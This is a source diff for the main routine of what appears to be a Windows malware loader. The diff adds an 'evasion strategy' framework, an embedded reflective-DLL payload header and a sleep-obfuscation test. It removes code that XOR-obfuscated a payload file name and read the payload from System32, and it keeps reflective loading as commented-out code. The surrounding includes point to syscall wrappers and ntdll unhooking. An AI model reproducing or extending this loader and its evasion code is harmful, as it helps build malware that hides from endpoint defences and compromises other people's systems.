@@ -6,6 +6,8 @@
 #include "../include/mem.h"      // For wrapped_NtAllocateVirtualMemory, wrapped_NtFreeVirtualMemory (if not directly via syscalls.h)
 #include "../include/evasion.h"  // For unhook_ntdll etc.
 #include "../include/rdi.h"      // For InvokeReflectiveLoader (will be called from here)
+#include "../include/strategy.h"  // For our new evasion strategy framework
+#include "payload.h"            // EMBEDDED PAYLOAD
 #ifdef _DEBUG
 #include <stdio.h>
 #endif
@@ -134,8 +136,12 @@ static BOOL build_payload_nt_path(WCHAR *outBuf, SIZE_T outCch)
 
 // Main function of the core loader logic
 int CoreLoaderMain(void) {
-    rtldr_ctx_t ctx_val;
+    RTLDR_CTX ctx_val;
     PRTLDR_CTX ctx = &ctx_val;
+    EVASION_STRATEGY strategy; // Allocate strategy struct on the stack
+
+    // Link the strategy module into the context
+    ctx->strategy = &strategy;
 
     // Initialize context: ntdll_base
     ctx->ntdll_base = find_module_base(L"ntdll.dll");
@@ -152,75 +158,47 @@ int CoreLoaderMain(void) {
         return -3;
     }
 
-    // TODO: Implement unhook_ntdll and call it here if desired early
-    // For now, focus on RDI first
-    // if (!unhook_ntdll(ctx->ntdll_base)) {
-    //     // Log: Failed to unhook ntdll, but continuing
-    // }
+    // Initialize our Evasion Strategy module
+    if (!Strategy_Initialize(ctx, ctx->strategy)) {
+        // Critical failure: cannot initialize evasion strategy
+        return -4;
+    }
 
-    PBYTE pPayloadBuffer = NULL;
-    DWORD dwPayloadSize = 0;
-    BOOL bReadSuccess = FALSE;
+    // --- TEST: Invoke Sleep Obfuscation ---
+    // Instead of running the payload, we will test our new sleep obfuscation module.
+    debug_message("Framework initialized. Testing sleep obfuscation for 5 seconds...");
 
-    // XOR encrypted payload name - "test_payload.dll" encrypted with key 0x42
-    // In production, this should be done at compile time via build script
-    WCHAR encryptedPayloadName[] = {
-        L't' ^ 0x42, L'e' ^ 0x42, L's' ^ 0x42, L't' ^ 0x42, L'_' ^ 0x42,
-        L'p' ^ 0x42, L'a' ^ 0x42, L'y' ^ 0x42, L'l' ^ 0x42, L'o' ^ 0x42,
-        L'a' ^ 0x42, L'd' ^ 0x42, L'.' ^ 0x42, L'd' ^ 0x42, L'l' ^ 0x42,
-        L'l' ^ 0x42, L'\0'
-    };
+    if (ctx->strategy->pfnObfuscateSleep) {
+        if (ctx->strategy->pfnObfuscateSleep(ctx, 5000)) {
+            debug_message("Sleep obfuscation test PASSED.");
+        } else {
+            debug_message("Sleep obfuscation test FAILED.");
+        }
+    } else {
+        debug_message("Sleep obfuscation function not available in strategy.");
+    }
     
-    // Decrypt payload name
-    xor_decrypt_wstring(encryptedPayloadName, 16, 0x42);
-    LPCWSTR payloadName = encryptedPayloadName;
+    // The original payload execution is commented out for this test.
+    /*
+    PBYTE pPayloadBuffer = raw_reflective_dll;
+    DWORD dwPayloadSize = raw_reflective_dll_len;
 
-    // Build full NT path: \??\C:\Windows\System32\test_payload.dll
-    WCHAR ntFullPath[260];
-    if(!build_payload_nt_path(ntFullPath,260)) return -4;
-
-    bReadSuccess = ReadPayloadFileToMemory(ctx, ntFullPath, &pPayloadBuffer, &dwPayloadSize);
-
-    if (bReadSuccess && pPayloadBuffer && dwPayloadSize > 0) {
+    if (pPayloadBuffer && dwPayloadSize > 0) {
         #ifdef _DEBUG
-        char buf[128];
-        sprintf_s(buf, sizeof(buf), "Read payload (%lu bytes)", dwPayloadSize);
-        debug_message(buf);
+        debug_message("Payload is embedded. Attempting to execute...");
         #endif
         
-        // InvokeReflectiveLoader now needs PRTLDR_CTX and LPVOID pParameter
-        // Pass NULL for pParameter for now.
         NTSTATUS rdiStatus = InvokeReflectiveLoader(ctx, pPayloadBuffer, "ReflectiveLoader", NULL);
 
         if (NT_SUCCESS(rdiStatus)) {
             debug_message("InvokeReflectiveLoader SUCCESS");
-            // The MessageBox from test_payload.dll should appear now.
         } else {
             debug_message("InvokeReflectiveLoader FAILED");
         }
-
-        // Free the buffer that held the DLL file content
-        SIZE_T regionSizeToFree = dwPayloadSize; // Use actual size for MEM_RELEASE if allocated with that size
-                                               // Or, if allocation was page-aligned, it might be slightly larger.
-                                               // NtFreeVirtualMemory with MEM_RELEASE needs the base and 0 size, 
-                                               // or base and original allocation size.
-        PVOID bufferToFree = pPayloadBuffer;
-        SIZE_T sizeForFree = 0; // For MEM_RELEASE, size must be 0 if freeing the entire region from allocation base.
-                               // If pPayloadBuffer is indeed the base of allocation, and regionSize from allocation is dwPayloadSize (or rounded up) then this is fine.
-                               // More robust: if NtAllocateVirtualMemory returned a rounded up size, use that. 
-                               // For now, assuming dwPayloadSize or 0 for MEM_RELEASE.
-
-        // When MEM_RELEASE is specified, dwSize must be zero. 
-        // The entire region that was reserved by NtAllocateVirtualMemory is released.
-        // The BaseAddress parameter must be the base address returned by NtAllocateVirtualMemory when the region was reserved.
-        NTSTATUS status = wrapped_NtFreeVirtualMemory(NtCurrentProcess(), &bufferToFree, &sizeForFree, MEM_RELEASE);
-        if (!NT_SUCCESS(status)) {
-            // Optionally log: "Failed to free payload buffer memory. Status: %X\n", status
-        }
-
     } else {
-        debug_message("Failed to read payload file");
+        debug_message("Embedded payload not found or is empty!");
     }
+    */
 
     // Loader has done its main job. 
     // The stub (RealEntry) will call NtTerminateProcess after this returns.
